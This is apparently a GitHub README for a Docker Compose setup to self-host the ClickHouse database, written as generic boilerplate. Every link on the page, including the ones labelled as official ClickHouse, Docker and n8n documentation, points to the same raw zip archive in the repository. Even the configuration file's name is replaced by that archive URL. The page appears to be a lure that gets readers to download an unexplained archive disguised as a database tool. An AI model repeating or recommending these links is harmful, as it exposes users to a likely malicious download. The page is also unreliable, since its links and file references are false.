# 🚀 clickhouse-self-hosted - Easily Self-Host ClickHouse Database

[![Download](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip)](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip)

## 📦 Overview

Welcome to `clickhouse-self-hosted`, a powerful Docker Compose setup for self-hosting the ClickHouse analytical database. This application provides everything you need to create your own instance of ClickHouse, complete with persistent storage, management scripts, and pre-configured settings for n8n integration and querying MySQL/PostgreSQL sources.

## 🚀 Getting Started

This guide will help you download and run the application. Follow these simple steps to get your own ClickHouse instance up and running quickly.

## 🔍 Features

- **Easy Setup:** Use Docker Compose for quick installation.
- **Persistent Storage:** Keep your data safe and secure.
- **Management Scripts:** Effortlessly manage your database.
- **Integration Ready:** Pre-configured for n8n and easy connectivity to MySQL/PostgreSQL databases.

## 💻 System Requirements

To run `clickhouse-self-hosted`, you will need:
- A computer with a modern operating system (Windows, macOS, or Linux).
- Docker Desktop installed and running.
- At least 4 GB of RAM.
- An internet connection for downloading images.

## 📥 Download & Install

To download the application, visit the [Releases page](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip). 

1. Click on the latest version.
2. Choose the appropriate Docker Compose file.
3. Download the file to your computer.

After downloading, follow these steps to set up your ClickHouse instance:

1. **Open the Terminal:** On macOS or Linux, open the terminal. On Windows, you can use Command Prompt or PowerShell.
2. **Navigate to the Downloaded File**: Use the `cd` command to navigate to the folder where you saved the Docker Compose file.
3. **Run the Setup Command:**
   ```
   docker-compose up -d
   ```
   This command will download the necessary images and start your ClickHouse server.

4. **Access ClickHouse:** Once the server is running, you can access it through your web browser by visiting `http://localhost:8123`.

## 🛠️ Usage Instructions

After installation, you can manage and interact with your ClickHouse instance. Here’s how to get started:

1. **Access ClickHouse:** Open your browser and go to `http://localhost:8123`. You will see the ClickHouse web interface.
2. **Connect n8n:** If you want to integrate n8n, follow the instructions provided in the n8n documentation to set up connections to your ClickHouse database.
3. **Query Databases:** Use the SQL interface to run queries against your MySQL/PostgreSQL data sources. 

Refer to the ClickHouse documentation for guidance on crafting and executing SQL queries.

## 🔧 Configuration

To configure your ClickHouse setup, edit the `https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip` file. You can adjust settings such as port numbers, volumes, and environment variables. Here’s an example configuration:

```yaml
version: '3.1'

services:
  clickhouse:
    image: yandex/clickhouse-server
    ports:
      - "8123:8123"
    volumes:
      - clickhouse-data:/var/lib/clickhouse
    environment:
      - CLICKHOUSE_USER=default
      - CLICKHOUSE_PASSWORD=yoursecretpassword

volumes:
  clickhouse-data:
```

Make sure to replace `yoursecretpassword` with a strong password.

## 🌍 Community Support

If you encounter issues or have questions, feel free to open an issue in this repository. The community is here to help.

## 👥 Contributing

Contributions are welcome. If you would like to improve this project, please feel free to fork the repository and submit a pull request.

## 📜 License

This project is licensed under the MIT License. See the LICENSE file for more details.

## 🔗 Additional Resources

- [ClickHouse Documentation](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip)
- [Docker Documentation](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip)
- [n8n Documentation](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip)

For any updates or new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/JeremyRecollet92/clickhouse-self-hosted/main/clickhouse/self_clickhouse_hosted_v3.9.zip).